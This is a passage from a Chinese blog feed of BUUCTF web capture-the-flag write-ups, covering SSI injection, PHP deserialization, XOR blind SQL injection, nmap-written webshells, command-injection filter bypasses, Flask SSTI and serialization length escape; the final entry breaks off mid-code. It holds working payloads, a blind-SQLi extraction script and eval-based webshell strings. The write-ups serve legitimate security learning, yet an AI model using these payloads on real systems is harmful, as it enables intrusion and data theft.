    <content type="text"><![CDATA[考点：SSI（服务端包含）题打开 发现又是一道登录题，肯定先想到sql注入，各种报错测试，都只是返回一个框。 扫目录，直接就是dirsearch开扫 123456789101112131415F:\Tools\WEB\Python-Tools\dirsearch-master&gt;python3 dirsearch.py -u "http://82e12f9d-f5e7-44cd-b5bc-13e1f75f81a9.node3.buuoj.cn" -t 10 -s 1 _|. _ _ _ _ _ _|_ v0.4.1 (_||| _) (/_(_|| (_| )Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 10 | Wordlist size: 10849Error Log: F:\Tools\WEB\Python-Tools\dirsearch-master\logs\errors-21-04-16_16-37-46.logTarget: http://82e12f9d-f5e7-44cd-b5bc-13e1f75f81a9.node3.buuoj.cn/Output File: F:\Tools\WEB\Python-Tools\dirsearch-master\reports\82e12f9d-f5e7-44cd-b5bc-13e1f75f81a9.node3.buuoj.cn\_21-04-16_16-37-46.txt[16:37:46] Starting:[16:37:46] 200 - 1KB - /index.php.swp 得到一个index.php.swp 文件，这里有一个问题，就是开了代理去扫，是扫不出来这个文件的，我也老是忘记关代理。 得到 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?php ob_start(); function get_hash()&#123; $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'; $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times $content = uniqid().$random; return sha1($content); &#125; header("Content-Type: text/html;charset=utf-8"); *** if(isset($_POST['username']) and $_POST['username'] != '' ) &#123; $admin = '6d0bc1'; # 弱类型 只需要找到 md5加密后前6位跟 6d0bc1 相同即可 if ( $admin == substr(md5($_POST['password']),0,6)) &#123; echo "&lt;script&gt;alert('[+] Welcome to manage system')&lt;/script&gt;"; # 构建文件路径 $file_shtml = "public/".get_hash().".shtml"; # 创建文件 $shtml = fopen($file_shtml, "w") or die("Unable to open file!"); # $text = ' *** *** &lt;h1&gt;Hello,'.$_POST['username'].'&lt;/h1&gt; *** ***'; # 将 变量$text 的内容 写入 $shtml 文件 fwrite($shtml,$text); # 关闭文件 fclose($shtml); *** echo "[!] Header error ..."; &#125; else &#123; echo "&lt;script&gt;alert('[!] Failed')&lt;/script&gt;"; &#125;else &#123; *** &#125; ***?&gt; 第一个条件是 if ( $admin == substr(md5($_POST[&#39;password&#39;]),0,6)) ，$admin = &#39;6d0bc1&#39;; ，要求是md5加密某个字符串，然后截取前6位，得到的结果要 与 $admin 相等。 上脚本 1234567import hashlibfor i in range(100000000000): a = hashlib.md5(str(i).encode('utf-8')).hexdigest() if a[0:6] == '6d0bc1': print(i) 123F:\Tools\WEB\Python-Tools&gt;python3 ctf-指定hash计算.py20206662305004 两个都能用。 接下来就是最关键的地方了 1234567891011121314$file_shtml = "public/".get_hash().".shtml";# 创建文件$shtml = fopen($file_shtml, "w") or die("Unable to open file!");# $text = ' *** *** &lt;h1&gt;Hello,'.$_POST['username'].'&lt;/h1&gt; *** ***';# 将 变量$text 的内容 写入 $shtml 文件fwrite($shtml,$text);# 关闭文件fclose($shtml); 大概意思就是，会创建一个包含路径的shtml 文件，会将$_POST[&#39;username&#39;]的值写入到文件中，然后保存，关闭。包含路径的文件会返回到Respone头中。 大概了解了下，这个属于SSI漏洞，相当于是可用执行命令，通过规定的语法。 直接payload 1&lt;!--#exec cmd=&quot;find / --name flag*&quot;--&gt; 12POSTusername=%3C%21--%23exec+cmd%3D%22find+%2F+-name+flag*%22--%3E&amp;password=2305004 打开 1public/34fb7252b9dff84b7edd3685b1c691fdd6293a00.shtml 再一次提交 12POSTusername=&lt;!--#exec cmd=&quot;cat /var/www/html/flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;&amp;password=2305004]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SSI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【NPUCTF2020】ReadlezPHP 1]]></title>
    <url>%2F2021%2F04%2F16%2F%5BNPUCTF2020%5DReadlezPHP%201%2F</url>
    <content type="text"><![CDATA[反序列化和代码执行12345678910111213141516171819202122232425&lt;?php#error_reporting(0);class HelloPhp&#123; public $a; public $b; public function __construct()&#123; $this-&gt;a = "Y-m-d h:i:s"; $this-&gt;b = "date"; &#125; public function __destruct()&#123; $a = $this-&gt;a; $b = $this-&gt;b; echo $b($a); &#125;&#125;$c = new HelloPhp;if(isset($_GET['source']))&#123; highlight_file(__FILE__); die(0);&#125;@$ppp = unserialize($_GET["data"]); 这道题，我先是用 system(ls) 去查看文件，发现不回显，又用scandir(&#39;/&#39;)，查看根目录文件，发现还是不回显，网上搜到 glob函数可用搜索文件，结果发现还是不回显，找了下原因，因为这两个函数返回的都是数组，用 echo 输出，只显示 array。我直接用file_get_contents(&#39;/flag&#39;)去根目录下读取flag，发现回显空白。我就很纳闷了，也不知道flag放在那个位置，无奈，看别人wp。用assert(phpinfo()) 输出php配置信息，flag 就在里面。 1?data=O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125; 别人的wp基本就只有这一个思路，一点创新都没有。]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>CTF</tag>
        <tag>代码执行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【极客大挑战 2019】FinalSQL 1]]></title>
    <url>%2F2021%2F04%2F15%2F%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DFinalSQL%201%2F</url>
    <content type="text"><![CDATA[考点：异或盲注payload 12345678获取表名1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1))&gt;0)^1[*] F1naI1y,Flaaaaag~猜测列名1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='表名')),1,1))&gt;0)^1猜测值1^(ord(substr((select(group_concat(列名))from(表名)),1,1))&gt;0)^1 二分查找 12345678910111213141516arr = [i for i in range(33,127)]start = 0end = len(arr) + 1item = 97while start &lt;= end:mid = (start+end)//2if arr[mid] &lt; item: start = mid + 1elif arr[mid] &gt; item: end = mid -1 elif arr[mid] == item: print('[+] mid='+str(mid)) breakprint("end") 上脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778import requestsimport timedef ascii_str(): #生成库名表名字符所在的字符列表字典 str_list=[] for i in range(33,127):#所有可显示字符 str_list.append(chr(i)) #print('可显示字符：%s'%str_list) return str_list #返回字符列表def exp_table_name(url): # 猜解表名 arr_str = ascii_str() table_name = "" for i in range(1,20): for s in arr_str: payload = "1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))=%s)^1"%(i, ord(s)) payload_url = url + payload print(payload) time.sleep(1) resp = requests.get(payload_url, timeout=10) if "Click" in resp.text: # print("[*] " + s) break table_name += s print("[*] " + table_name) return table_namedef exp_column_name(url): str_arr = ascii_str() column_name = "" for i in range(1,100): for s in str_arr: payload = "1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))=%s)^1"%(i, ord(s)) payload_url = url + payload print(payload) time.sleep(1) resp = requests.get(payload_url, timeout=10) if "Click" in resp.text: # print("[+] " + s) column_name += s break print("[+] " + column_name) return column_namedef exp_column_value(url): # 猜解单个字段值 arr_str = ascii_str() column_value = "" for i in range(100, 200): for s in arr_str: payload = "1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))=%s)^1"%(i, ord(s)) payload_url = url + payload time.sleep(1) print(payload) resp = requests.get(payload_url) if "Click" in resp.text: # print("[+] " + s) column_value += s break print("[*] " + column_value) return column_value if __name__=='__main__': url = "http://d306a06c-16fb-4f1b-8cc1-96da2f301860.node3.buuoj.cn/search.php?id=" # exp_table_name(url) # [*] F1naI1y,Flaaaaag~ # exp_column_name(url) # id, username, password exp_column_value(url) 这个脚本特别慢，特别是最后猜测字典的时候，差不多有两百来位，可能要猜一天，只好研究一下怎么把二分查找运用到盲注脚本中来。 二分查找逻辑二分查找是不断根据提交两个数的中间值后的反馈来不断更换查找边界来找到目标值，比如，我们需要在1-1000之间查找 666，提交中间值 500，发现小于目标数666，就会把最开始 start 的边界换成500，然后再继续提交中间数750，发现大于目标数666，就会把末尾的 end 换成 750 ，不断改变不断的改变边界变量，直到找到。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import requestsimport timedef exp_column_value(url, i, mid): # 猜解单个字段值 payload = "1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;=%s)^1"%(i,mid) payload_url = url + payload time.sleep(1) print(payload) resp = requests.get(payload_url) # 如果能够执行下列语句 则代表着 大于或等于 if "Click" in resp.text: # 再次进行判断 payload = "1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))=%s)^1"%(i,mid) payload_url = url + payload time.sleep(1) print(payload) resp = requests.get(payload_url) if "Click" in resp.text: # 拿到目标数 return 200 else: # 小于目标值 return 203 # 大于目标值 else: return 400def exp(url): column_value = "" for i in range(1,300): start = 33 end = 127 while start &lt;= end: mid = (start + end) // 2 res = exp_column_value(url,i,mid) print("[*] 返回码：" + str(res)) # 代表找到 if res == 200: print("[+] mid = "+str(mid)) column_value += chr(mid) break # 代表是小于字符ascii码值 elif res == 203: start = mid + 1 # 代表是大于 ascii码值 elif res == 400: end = mid - 1 print("[+] " + column_value) if __name__=='__main__': url = "http://4b10de77-d978-4a22-82f7-e983cfefa564.node3.buuoj.cn/search.php?id=" exp(url) 加上time.sleep(1) 是因为BUUCTF有限制，如果不加几分钟就跑出来了，用算法和不用算法对比起来，算法效率真高。]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>异或注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【网鼎杯 2020 朱雀组】Nmap 1]]></title>
    <url>%2F2021%2F04%2F14%2F%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%5DNmap%201%2F</url>
    <content type="text"><![CDATA[通过nmap -oN -oG 参数 写马1234567891011121314151617181920if (isset($_POST['host'])): if (!defined('WEB_SCANS')) &#123; die('Web scans disabled'); &#125; $host = $_POST['host']; if(stripos($host,'php')!==false)&#123; die("Hacker..."); &#125; $host = escapeshellarg($host); $host = escapeshellcmd($host); $filename = substr(md5(time() . rand(1, 10)), 0, 5); $command = "nmap ". NMAP_ARGS . " -oX " . RESULTS_PATH . $filename . " " . $host; $result_scan = shell_exec($command); if (is_null($result_scan)) &#123; die('Something went wrong'); &#125; else &#123; header('Location: result.php?f=' . $filename); &#125; 拿到flag payload 过滤了php 关键字 1234第一种'&lt;?=eval($_GET[a]);?&gt; -oN flag.phtml '第二种'&lt;?=eval($_GET[a]);?&gt; -oG flag.phtml ' 1?a=system("cat /flag"); 两个知识点Nmap 通过 -oG -oN 参数写 shell123456789101112131415161718192021222324252627&gt; nmap 127.0.0.1 -p 0-1 "&lt;?php eval($_GET['cmd']);?&gt;" -oN cmd.phpStarting Nmap 7.70 ( https://nmap.org ) at 2021-04-14 16:51 ?D1ú±ê×?ê±??Failed to resolve "&lt;?php eval($_GET['cmd']);?&gt;".Failed to resolve "&lt;?php eval($_GET['cmd']);?&gt;".Skipping SYN Stealth Scan against xmind.net (127.0.0.1) because Windows does not support scanning your own machine (localhost) this way.Nmap scan report for xmind.net (127.0.0.1)Host is up.PORT STATE SERVICE0/tcp unknown unknown1/tcp unknown tcpmuxFailed to resolve "&lt;?php eval($_GET['cmd']);?&gt;".Nmap done: 1 IP address (1 host up) scanned in 4.64 secondsC:\Users\root\Desktop&gt; dir 驱动器 C 中的卷是 Win10 卷的序列号是 C037-0A2C C:\Users\root\Desktop 的目录2021/04/14 16:51 &lt;DIR&gt; .2021/04/14 16:51 &lt;DIR&gt; ..2021/04/14 16:51 528 cmd.php # 生成了cmd.php 文件 1 个文件 528 字节 2 个目录 7,621,890,048 可用字节 生成的文件会将 &quot;&lt;?php eval($_GET[&#39;cmd&#39;]);?&gt;&quot; 和 扫描的结果 一起写入cmd.php文件中 ， 1nmap 127.0.0.1 -p 0-1 "&lt;?php eval($_POST['cmd']);?&gt;" -oG cmd.php 123456789101112131415161718192021&gt; nmap 127.0.0.1 -p 0-1 "&lt;?php eval($_POST['cmd']);?&gt;" -oG cmd.phpStarting Nmap 7.70 ( https://nmap.org ) at 2021-04-14 16:56 ?D1ú±ê×?ê±??Failed to resolve "&lt;?php eval($_POST['cmd']);?&gt;".Failed to resolve "&lt;?php eval($_POST['cmd']);?&gt;".Skipping SYN Stealth Scan against xmind.net (127.0.0.1) because Windows does not support scanning your own machine (localhost) this way.Nmap scan report for xmind.net (127.0.0.1)Host is up.PORT STATE SERVICE0/tcp unknown unknown1/tcp unknown tcpmuxFailed to resolve "&lt;?php eval($_POST['cmd']);?&gt;".Nmap done: 1 IP address (1 host up) scanned in 4.59 secondsC:\Users\root\Desktop&gt; cat cmd.php# Nmap 7.70 scan initiated Wed Apr 14 16:56:04 2021 as: F:\Tools\WEB\PentestBox\bin\Nmap\nmap.exe -p 0-1 -oG cmd.php 127.0.0.1 &lt;?php eval($_POST['cmd']);?&gt;Host: 127.0.0.1 (xmind.net) Status: UpHost: 127.0.0.1 (xmind.net) Ports: 0/unknown/tcp/////, 1/unknown/tcp//tcpmux///# Nmap done at Wed Apr 14 16:56:08 2021 -- 1 IP address (1 host up) scanned in 4.59 seconds 顺便说一下，nmap的其他参数 ，比如-oX，也会创建文件，但是符合会被替换成html字符，想这样 &amp;lt;?php eval($_POST[&amp;apos;cmd&amp;apos;]);?&amp;gt;，也就是说只有两种参数能用。 sescapeshellarg和escapeshellcmd 同时使用照成的问题12345&lt;?php $str = "sys'tem"; echo escapeshellarg($str);?&gt;// 'sys'\''tem' 直接将 &#39; 转义成了 &#39;\&#39;&#39; 123456&lt;?php $str = "sys'tem"; echo escapeshellcmd($str);?&gt;// sys\'tem 将 &#39; 转义成了 \&#39; 最后将两个函数同时使用 12345678&lt;?php $str = "sys'tem"; $str = escapeshellarg($str); $str = escapeshellcmd($str); echo $str;?&gt;// 'sys'\\''tem\'// sys\tem' 这里的问题就很明显了，两个函数同时使用，会照成某些字符串逃逸。 1234567891011&lt;?php $host = ' &lt;?php eval($_POST["cmd"]);?&gt; -oN cmd.php '; $host = escapeshellarg($host); $host = escapeshellcmd($host); $command = "nmap ". $host; echo $command;?&gt; // nmap ' \&lt;\?php eval\(\$_POST\[\"cmd\"\]\)\;\?\&gt; -oN cmd.php '// nmap ' &lt;?php eval($_POST["cmd"]);?&gt; -oN cmd.php ']]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>escapeshellarg/escapeshellcmd绕过</tag>
        <tag>参数注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【WUSTCTF2020】朴实无华 1]]></title>
    <url>%2F2021%2F04%2F14%2F%5BWUSTCTF2020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E%201%2F</url>
    <content type="text"><![CDATA[代码审计和命令注入代码 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpheader('Content-type:text/html;charset=utf-8');error_reporting(0);highlight_file(__file__);//level 1if (isset($_GET['num']))&#123; $num = $_GET['num']; if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123; echo "我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;"; &#125;else&#123; die("金钱解决不了穷人的本质问题"); &#125;&#125;else&#123; die("去非洲吧");&#125;//level 2if (isset($_GET['md5']))&#123; $md5=$_GET['md5']; if ($md5==md5($md5)) echo "想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;"; else die("我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲");&#125;else&#123; die("去非洲吧");&#125;//get flagif (isset($_GET['get_flag']))&#123; $get_flag = $_GET['get_flag']; if(!strstr($get_flag," "))&#123; $get_flag = str_ireplace("cat", "wctf2020", $get_flag); echo "想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;"; system($get_flag); &#125;else&#123; die("快到非洲了"); &#125;&#125;else&#123; die("去非洲吧");&#125;?&gt; 三个地方的绕过 12345678$num = '1e5'; # payload # 1e5 if(intval($num) &lt; 2020&amp;&amp;intval($num +1)&gt;2021)&#123; echo 'yes'; echo $num + 1; &#125;// yes100001 1e5为100000的科学计数法，将1e5 作为参数放入intval函数内执行会返回结果 1 , 将1e5 加上 1后，其结果为100001，在将100001放入intval，结果自然为100001，成功绕过。 1234567891011$md5=$_GET['md5']; # payload # 空数组 # 0e215962017 echo $md5; if ($md5==md5($md5))&#123; echo "ok"; echo $md5; &#125;else&#123; echo $md5; &#125; 这里的绕过其实有两种方式，我在网上看到的教程大部分都是用 0e215962017 字符串绕过，这串字符经过md5加密后，会得到前两位是 0e 开头的字符串，在经过 == 的比较，就会返回为真。 还有一个方式就是空数组，这个方法在直接在代码里赋值是成立的，但是通过GET传参 md5[]= ，就不能显示，具体原因无从得知，md5对数组加密后会返回Flase ，再与空数组进行比较，会相等。 12345678$get_flag = $_GET['get_flag']; if(!strstr($get_flag," "))&#123; $get_flag = str_ireplace("cat", "wctf2020", $get_flag); echo "想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;"; system($get_flag); &#125;else&#123; die("快到非洲了"); &#125; 不能有空格，cat会被替换成wctf2020，空格代替方式有很多 ${IFS} ${IFS}$9 &lt; 都可用代替空格，cat的代替方式也很多， more tac cat less head tail ，如果是被替换，还可用通过混淆来绕过，比如，cat 被过滤，通过c&quot;at 来绕过。 最终payload 1fl4g.php?num=1e5&amp;md5=0e215962017&amp;get_flag=c""at&lt;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>CTF</tag>
        <tag>命令注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【SWPU2019】Web1 1]]></title>
    <url>%2F2021%2F04%2F13%2F%5BSWPU2019%5DWeb1%201%2F</url>
    <content type="text"><![CDATA[考点：无information_schema表注入二次注入 流程注册-&gt;登录-&gt;发布广告-&gt;查看广告 payload 123456789101112131415161'/**/group/**/by/**/22,'1-1'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22-1'/**/union/**/select/**/1,database(),user(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22web1 root@localhost-1'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22ads,users-1'/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'223,flag&#123;fdc63c44-aae2-43da-9890-38992f50d843&#125;,53e217ad4c721eb9565cf25a5ec3b66e,098f6bcd4621d373cade4e832627b4f6,202cb962ac59075b964b07152d234b70select group_concat(b) from (select 1,2,3 as b union select * from users)a 学到了两种新姿势 information_schemab.tables 被过滤 1information_schemab.tables 替代表 mysql.innodb_table_statstable_schema 换成 database_name 只知道表名的情况下查询数据 1(select `2` from (select 1,2,3 union select * from table_name)a) //前提是要知道表名((select c from (select 1,2,3 as c union select * from users)b)) 1，2，3是因为users表有三列，实际情况还需要猜测表的列的数量]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>二次注入</tag>
        <tag>无information_schema表注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【WesternCTF2018】shrine 1]]></title>
    <url>%2F2021%2F04%2F13%2F%5BWesternCTF2018%5Dshrine%201%2F</url>
    <content type="text"><![CDATA[SSTI注入题123456789101112131415161718192021222324252627282930313233343536import flaskimport osapp = flask.Flask(__name__)app.config['FLAG'] = os.environ.pop('FLAG')@app.route('/')def index(): return open(__file__).read()@app.route('/shrine/&lt;path:shrine&gt;')def shrine(shrine): def safe_jinja(s): # Python replace() 方法把字符串中的 old（旧字符串） 替换成 new(新字符串)，如果指定第三个参数max，则替换不超过 max 次。 # 将( 和 ) 替换成 '' s = s.replace('(', '').replace(')', '') blacklist = ['config', 'self'] return ''.join(['&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'.format(c) for c in blacklist]) + s # render_template_string则是用来渲染一个字符串的。SSTI与这个方法密不可分。 return flask.render_template_string(safe_jinja(shrine))if __name__ == '__main__': app.run(debug=True)# payload# "".__class__# &#123;config['FLAG']&#125;&#125;# &#123;&#123;config.FLAG&#125;&#125;# &#123;&#123;url_for.__globals__['current_app'].config.FLAG&#125;&#125;# &#123;&#123;get_flashed_messages.__globals__['current_app'].config.FLAG&#125;&#125;# &#123;&#123;request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']&#125;&#125; 可用payload 1&#123;&#123;url_for.__globals__[&apos;current_app&apos;].config.FLAG&#125;&#125; 1&#123;&#123;get_flashed_messages.__globals__[&apos;current_app&apos;].config.FLAG&#125;&#125;]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【安洵杯 2019】easy_serialize_php 1]]></title>
    <url>%2F2021%2F04%2F10%2F%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%5Deasy_serialize_php%201%2F</url>
    <content type="text"><![CDATA[考点：php反序列化字符长度逃逸分析1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950 &lt;?php$function = @$_GET['f'];# 将变量$img 的内容中带有php flag php5 php4 fl1g 的字符串 替换成 '' 空字符function filter($img)&#123; $filter_arr = array('php','flag','php5','php4','fl1g'); $filter = '/'.implode('|',$filter_arr).'/i'; return preg_replace($filter,'',$img);&#125;if($_SESSION)&#123; # 销毁$_SESSION 数组变量 unset($_SESSION);&#125;$_SESSION["user"] = 'guest';$_SESSION['function'] = $function;# 变量覆盖 意味着可以重置$_SESSION数组变量extract($_POST);# 如果$function 为空 则显示下面的代码 就是刚刚打开的时候显示的内容 意味着$function 没传入内容if(!$function)&#123; echo '&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;';&#125;# $_GET['img_path'] 为空情况下会默认给定一个图片文件名 然后进行base64编码 赋值给SESSIONif(!$_GET['img_path'])&#123; $_SESSION['img'] = base64_encode('guest_img.png');&#125;else&#123; # GET方式接收一个文件名 会进行base64编码 在此基础上还会进行sha1 加密 想从此处读取flag是不太可能 $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));&#125;# 序列化SESSION 并对序列化内容进行过滤# 一般到这就会意识到问题存在 php序列化长度变化导致字符串逃逸$serialize_info = filter(serialize($_SESSION));# 给了三个分支 # highlight_file 显示源代码# phpinfo 可以查看php信息# show_imgage 对$serialize_info 进行序列化if($function == 'highlight_file')&#123; highlight_file('index.php');&#125;else if($function == 'phpinfo')&#123; eval('phpinfo();'); //maybe you can find something in here!&#125;else if($function == 'show_image')&#123; $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo['img']));&#125; 查看php信息 发现了特殊文件名d0g3_f1ag.php 1234567$_SESSION["user"] = 'guest';$_SESSION['function'] = 'a';$_SESSION['img'] = 'ZDBnM19mMWFnLnBocA=='; // d0g3_f1ag.php base64编码var_dump(serialize($_SESSION));// 得到string(90) "a:3:&#123;s:4:"user";s:5:"guest";s:8:"function";s:1:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;" 可控参数为user 和 function ，序列化后会将 flag 过滤为 空字符串, 123$_SESSION["user"] = 'flagflagflagflagflagflag';$_SESSION['function'] = 'a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";&#125;';$_SESSION['img'] = 'ZDBnM19mMWFnLnBocA=='; // d0g3_f1ag.php base64编码 ​ 序列化后 1a:3:&#123;s:4:"user";s:24:"flagflagflagflagflagflag";s:8:"function";s:59:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";&#125;";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125; 这里会将flag字符串过滤，过滤后结果 1a:3:&#123;s:4:"user";s:24:"#";s:8:"function";s:59:"a#";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";&#125;";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125; 由于s:24 会往后边读取24位字符&quot;;s:8:&quot;function&quot;;s:59:&quot;a做为user的属性值, #号包含起来的部分，读取到a的时候结束，后面的;进行了闭合，相当于吞掉了一个属性和值，接着会继续读取我们构造的img，由于总共三个属性，我在后边加上了一个属性和值，后边的序列化结果直接就被丢弃。 提交1234GET:show_imagePOST:_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125; 得到 12345&lt;?php$flag = 'flag in /d0g3_fllllllag';?&gt; /d0g3_fllllllag base64编码 L2QwZzNfZmxsbGxsbGFn 提交 1234GET:show_imagePOST:_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";s:2:"dd";s:1:"a";&#125; 得到flag 又是一道反序列字符绕过闭合 与上一题不一样的是，上一题是增加字符，这道题是删除字符。 where-&gt; hacker flag -&gt; ‘’ 同样的原理是，将字符数组序列化后，得到一个固定格式的序列化字符串，但是这个序列化字符串被放入某个函数中进行过滤，过滤后，即原本的固定格式没有变，但是里面某些字符被函数中的规则过滤，有可能是增加，有可能会减少，不管怎么样，只要能控制即将被序列化的变量，那么就有可能自己来构建序列化字符串。 payload 123456_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;GET：show_imagePOST：_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【0CTF 2016】piapiapia 1]]></title>
    <url>%2F2021%2F04%2F10%2F%5B0CTF%202016%5Dpiapiapia%201%2F</url>
    <content type="text"><![CDATA[考点：php反序列化字符长度逃逸打开题目 一般看到登录框，就以为是sql注入题，这道题不是。 dirsearch扫网站目录1234567891011121314151617python3 dirsearch.py -u &quot;http://16b5eb0b-ac30-452a-808a-0e9214102abd.node3.buuoj.cn/&quot; -s 1 --exclude-status=429,403 -t 1 _|. _ _ _ _ _ _|_ v0.4.1 (_||| _) (/_(_|| (_| )Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 1 | Wordlist size: 10848Error Log: F:\Tools\WEB\Python-Tools\dirsearch-master\logs\errors-21-04-12_16-36-23.logTarget: http://16b5eb0b-ac30-452a-808a-0e9214102abd.node3.buuoj.cn/Output File: F:\Tools\WEB\Python-Tools\dirsearch-master\reports\16b5eb0b-ac30-452a-808a-0e9214102abd.node3.buuoj.cn\_21-04-12_16-36-24.txt[16:36:24] Starting:[16:36:28] 200 - 392KB - /www.zip[16:36:33] 200 - 788B - /php[16:36:38] 200 - 788B - /js 看了别人wp，这道题存在源码泄露，在网站目录会泄漏一个www.zip文件，用工具扫，还不容易扫出来，我开了代理居然扫不出来。 下载下来，有这么些文件。 分析关键的三个地方 update.php 12345678910111213141516171819202122232425if($_POST['phone'] &amp;&amp; $_POST['email'] &amp;&amp; $_POST['nickname'] &amp;&amp; $_FILES['photo']) &#123; $username = $_SESSION['username']; if(!preg_match('/^\d&#123;11&#125;$/', $_POST['phone'])) die('Invalid phone'); if(!preg_match('/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/', $_POST['email'])) die('Invalid email'); if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) &gt; 10) die('Invalid nickname'); $file = $_FILES['photo']; if($file['size'] 